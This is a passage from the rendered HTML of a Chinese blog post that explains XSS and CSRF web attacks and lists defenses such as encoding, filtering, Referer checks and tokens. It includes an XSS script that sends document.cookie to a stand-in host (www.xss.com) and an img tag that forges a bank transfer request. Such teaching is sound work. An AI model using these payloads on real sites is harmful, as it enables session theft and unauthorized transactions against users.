+</span></span><span style="display:flex;"><span> &lt;/<span style="font-weight:bold">script</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那这个网站就可能会挂</p>
+<p>或者这么写</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">var</span> img = <span style="color:#fff;font-weight:bold">document</span>.createElement(<span style="color:#0ff;font-weight:bold">&#39;img&#39;</span>)
+</span></span><span style="display:flex;"><span>  img.src=<span style="color:#0ff;font-weight:bold">&#39;http://www.xss.com?cookie=&#39;</span> + <span style="color:#fff;font-weight:bold">document</span>.cookie
+</span></span><span style="display:flex;"><span>  img.style.display=<span style="color:#0ff;font-weight:bold">&#39;none&#39;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#fff;font-weight:bold">document</span>.getElementsByTagName(<span style="color:#0ff;font-weight:bold">&#39;body&#39;</span>)[<span style="color:#ff0;font-weight:bold">0</span>].appendChild(img)
+</span></span><span style="display:flex;"><span> &lt;/<span style="font-weight:bold">script</span>&gt;  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这就就是将你该页面的cookie发送到http://www.xss.com这个网址（这个跟后面要说csrf是有点不一样，但一般是这两种混合来使用）</p>
+<h4 id="如何预防xss">如何预防xss？<a hidden class="anchor" aria-hidden="true" href="#如何预防xss">#</a></h4>
+<ul>
+<li>首先是<strong>过滤</strong>。对诸如<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;a&gt;</code>等标签进行过滤。（尽管可能会逃过）</li>
+<li>其次是编码。像一些常见的符号，如&lt;&gt;在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。</li>
+<li>最后是<strong>限制</strong>。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御（这里要记住，不能只是单纯的在表单里设置长度，因为是可以改的）</li>
+</ul>
+<h3 id="csrf攻击">CSRF攻击<a hidden class="anchor" aria-hidden="true" href="#csrf攻击">#</a></h3>
+<p>说完了上面的xss攻击，现在，我们来看看csrf攻击</p>
+<blockquote>
+<p>概念：<code>CSRF</code>攻击，英文全称为Cross-site request forgery，中文的名称为跨站请求伪造，也被称为one click attack/session riding，其缩写为CSRF/XSRF,是一种非常常见的<code>Web</code>攻击方式</p>
+</blockquote>
+<p>换句话说：就是hacker盗取了你的信息（比如 cookie，token这些），然后再以你的名义发送请求</p>
+<p>比如：</p>
+<p><img loading="lazy" src="https://i.loli.net/2020/10/24/4HC7nMAOz5px6bs.jpg" alt="timg"  />
+</p>
+<p>首先用户在A网站登录了支付宝，然后支付宝把cookie返回给了游览器，但是，该用户在还没退出A网页时，又登录了恶意网站B，然后B网站又发送了一些带攻击型的代码，发送请求要求访问A网站，在这种情况下，用户并不知道发生了什么，但A网站是根据发了的cookie权限处理该请求的，并不知道该请求其实是由B发起的。</p>
+<p>举个例子</p>
+<p>如果某个银行网站，对转账的请求为：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</p>
+<p>那么如果在网站B上，有这样一行代码</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="font-weight:bold">img</span> <span style="color:#007f7f">src</span>=<span style="color:#0ff;font-weight:bold">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），而又恰好你刚刚登录了A网站，游览器还存又cookie，所以当你登录B网站时，浏 览器会带上你的银行网站A的Cookie发出Get请求</p>
+<p>虽然这只是一个简单的例子，但即使该银行换成只能post表单请求，但B网站也能发送POST表单请求，这里我就不赘述了</p>
+<p>其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制，WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的（也就是即是我们拿到了令牌，也不知道是否是用户批准的）</p>
+<p>如何防御？</p>
+<ol>
+<li>
+<p>验证码，</p>
+<p>强制让用户在进行每次操作的时候输入验证码，以便让他知道自己在干什么（虽然这样给用户的体验会很不好）</p>
+</li>
+<li>
+<p>检查HTTP Referer字段</p>
+<p>在HTTP请求中，<code>Referer</code>字段的数据会带着上一次请求的地址，因此我们通过获取Referer字段，检测该字段是否为我们自己的站点地址，这样就可以避免CSRF攻击</p>
+<p>但是这也有缺点</p>
+<ul>
+<li>用户设置禁止发送Referer字段（跟设置禁止保存cookie是一样的）</li>
+<li>个别插件可以伪造Referer字段</li>
+</ul>
+</li>
+<li>
+<p>设置Token</p>
+<p>很明显，CSRF攻击的本质是攻击者可以猜测到构造一个请求所需要的参数（也就是令牌），那么，如果要防御，其方法就是让参数变得不可猜测，token就可以做到</p>
+<p>但要注意的是</p>
+<ul>
+<li>token必须保密（也就是加密）</li>
+<li>提交token时，不可直接放在url中（所以我们直接放在头部）</li>
+</ul>
+</li>
+<li>
+<p>避免全站通用cookie，设置好cookie的域</p>
+</li>
+</ol>
+<h3 id="总结">总结：<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h3>
+<p>CSRF利用的是网站的令牌去请求，这属于网站本身的漏洞</p>
+<p>XSS属于的是注入攻击，大多在留言板上（虽然现在一般的网址已经不行了）</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/z-anshun/en/tags/web%E6%94%BB%E5%87%BB/">Web攻击</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/z-anshun/en/posts/tech/java/day01/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>JAVA学习第一天</span>
+  </a>
+  <a class="next" href="http://localhost:1313/z-anshun/en/posts/blog/struct/">
+    <span class="title">Next »</span>
+    <br>
+    <span>初步了解区块链与微服务</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share XSS攻击和CSRF攻击 on x"
+            href="https://x.com/intent/tweet/?text=XSS%e6%94%bb%e5%87%bb%e5%92%8cCSRF%e6%94%bb%e5%87%bb&amp;url=http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f&amp;hashtags=web%e6%94%bb%e5%87%bb">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share XSS攻击和CSRF攻击 on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f&amp;title=XSS%e6%94%bb%e5%87%bb%e5%92%8cCSRF%e6%94%bb%e5%87%bb&amp;summary=XSS%e6%94%bb%e5%87%bb%e5%92%8cCSRF%e6%94%bb%e5%87%bb&amp;source=http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share XSS攻击和CSRF攻击 on reddit"
+            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f&title=XSS%e6%94%bb%e5%87%bb%e5%92%8cCSRF%e6%94%bb%e5%87%bb">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share XSS攻击和CSRF攻击 on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share XSS攻击和CSRF攻击 on whatsapp"
+            href="https://api.whatsapp.com/send?text=XSS%e6%94%bb%e5%87%bb%e5%92%8cCSRF%e6%94%bb%e5%87%bb%20-%20http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share XSS攻击和CSRF攻击 on telegram"
+            href="https://telegram.me/share/url?text=XSS%e6%94%bb%e5%87%bb%e5%92%8cCSRF%e6%94%bb%e5%87%bb&amp;url=http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share XSS攻击和CSRF攻击 on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=XSS%e6%94%bb%e5%87%bb%e5%92%8cCSRF%e6%94%bb%e5%87%bb&u=http%3a%2f%2flocalhost%3a1313%2fz-anshun%2fen%2fposts%2fblog%2fxss%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://localhost:1313/z-anshun/en/">Noodles2hg的博客</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
